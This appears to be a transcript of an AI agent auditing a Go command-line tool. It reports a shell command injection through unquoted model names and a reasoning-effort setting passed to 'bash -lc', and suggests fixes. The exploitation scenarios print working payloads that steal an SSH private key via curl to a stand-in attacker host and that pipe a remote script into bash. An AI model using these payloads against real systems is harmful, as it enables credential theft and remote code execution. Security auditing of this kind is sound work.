---
agent_num: 1
provider: claude
---

This is the `dj-broadcast` repo, not the Conclave codebase. Let me check if there's a conclave directory or if the files mentioned exist somewhere.The Conclave codebase isn't in this working directory — only `.conclave/` output files from a previous audit are here. The actual source code I need to review (internal/cli/*.go, cmd/conclave/main.go) doesn't exist in this repository.

Let me check if it's installed or available elsewhere.The Conclave source code isn't in this repository. Let me search for it.Found it at `/Users/pk/conclave/`. Let me read the CLI command handler files that are the focus of this review.Now let me look at the agent implementations that execute shell commands, and the prompt construction.Critical finding emerging. The prompt is shell-quoted but the **model name** is not. Let me trace where model names come from.Let me check the config loader to see where the config file is read from.Let me look at the web server and prompt templates more carefully.Now let me look at the remaining CLI handlers and the convene module to check for the parallel logic gap.Let me check the state persistence module for path traversal.Let me also look at the assess and convene modules for the prompt construction flow.I've now reviewed the full codebase. Here is the critical finding.

---

## Vulnerability: Shell Command Injection via Unquoted Model Names

### Location
- `/Users/pk/conclave/internal/agent/claude.go` lines 99-101
- `/Users/pk/conclave/internal/agent/gemini.go` lines 54-56
- `/Users/pk/conclave/internal/agent/codex.go` lines 56-62

### The Parallel Logic Gap

The codebase has a `shellQuote()` function (`agent.go:22-24`) that correctly escapes strings for shell safety. It is applied to the **prompt** parameter — but NOT to **model names** or **reasoning effort** — even though all of these are concatenated into the same `bash -lc` command string.

**ClaudeAgent** (`claude.go:96-102`):
```go
claudeArgs += " --model " + a.model          // ← NOT quoted
claudeArgs += " -p " + shellQuote(prompt)     // ← quoted
cmd := exec.CommandContext(ctx, "bash", "-lc", claudeArgs)
```

**GeminiAgent** (`gemini.go:53-58`):
```go
geminiArgs += " --model " + a.model           // ← NOT quoted
cmd := exec.CommandContext(ctx, "bash", "-lc", geminiArgs)
```

**CodexAgent** (`codex.go:55-65`):
```go
codexArgs += " --model " + a.model            // ← NOT quoted
codexArgs += fmt.Sprintf(` --config model_reasoning_effort='"%s"'`, a.reasoningEffort)  // ← breakable quoting
cmd := exec.CommandContext(ctx, "bash", "-lc", codexArgs)
```

The Codex reasoning effort is placed inside single quotes but the value itself is **never escaped for single-quote characters**, so a `'` in the value breaks out of the quoting.

### Attack Vector

Model names flow from two sources, both without sanitization:

1. **CLI flags** (`root.go:48-50`): `--claude=VALUE`, `--codex=MODEL:EFFORT`, `--gemini=VALUE` — parsed in `getModel()` and `getCodexReasoningEffort()` with no shell-character validation.

2. **Config file** (`~/.conclave/config.yaml`): Model specs like `claude sonnet` are parsed by `ParseModelSpec()` (`parser.go:13-44`) which does `strings.SplitN(spec, " ", 2)` — the model portion is passed through with zero sanitization, validated only for provider name (not model content).

### Concrete Exploitation Scenario

**Scenario: Config file poisoning on a shared machine or CI runner**

1. Attacker gains write access to `~/.conclave/config.yaml` on a shared CI/CD runner or developer machine (e.g., via a compromised dependency, a malicious pre-commit hook in a repo, or direct access to a shared build agent).

2. Attacker writes:
   ```yaml
   profiles:
     default:
       plan: "claude sonnet$(curl attacker.com/exfil?key=$(cat ~/.ssh/id_rsa|base64))"
       assess:
         - "claude sonnet"
   ```

3. Victim runs `conclave run .` (or any conclave command). The `initConfig` function loads `~/.conclave/config.yaml`, parses the profile, and creates a `ModelSpec` with `Model: "sonnet$(curl attacker.com/exfil?key=$(cat ~/.ssh/id_rsa|base64))"`.

4. When `ClaudeAgent.Run()` executes, it constructs:
   ```
   bash -lc 'claude --dangerously-skip-permissions --tools Read,Grep,Glob,LSP --output-format stream-json --verbose --include-partial-messages --model sonnet$(curl attacker.com/exfil?key=$(cat ~/.ssh/id_rsa|base64)) -p ...'
   ```

5. Bash performs command substitution before `claude` ever runs. The attacker's SSH private key (or any other secret) is exfiltrated.

**Scenario: Codex reasoning effort injection via CLI**

```bash
conclave --codex="o3:high' ; curl attacker.com/pwn | bash #" run .
```

`getCodexReasoningEffort()` returns `high' ; curl attacker.com/pwn | bash #`. This is interpolated into:
```
--config model_reasoning_effort='"high' ; curl attacker.com/pwn | bash #"'
```
The single quote at `high'` terminates the shell quoting, and the semicolon starts a new command.

### Impact

Arbitrary command execution as the user running Conclave. The attacker gains:
- Full RCE on the host
- Access to all credentials, SSH keys, API tokens in the user's environment
- Ability to modify code, push to repos, pivot to other systems

### Severity: **High**

This is a **second-order command injection with a realistic trigger** (config file poisoning). The `shellQuote` function demonstrates awareness of the shell injection threat for prompt data, yet model names and reasoning effort pass through the identical `bash -lc` execution path completely unprotected. The fix is straightforward: apply `shellQuote()` to `a.model` and `a.reasoningEffort` everywhere they're concatenated into shell commands, or better yet, avoid `bash -lc` entirely by using `exec.Command` with discrete arguments (as is already done correctly for `gh` commands elsewhere in the codebase — another parallel implementation gap).
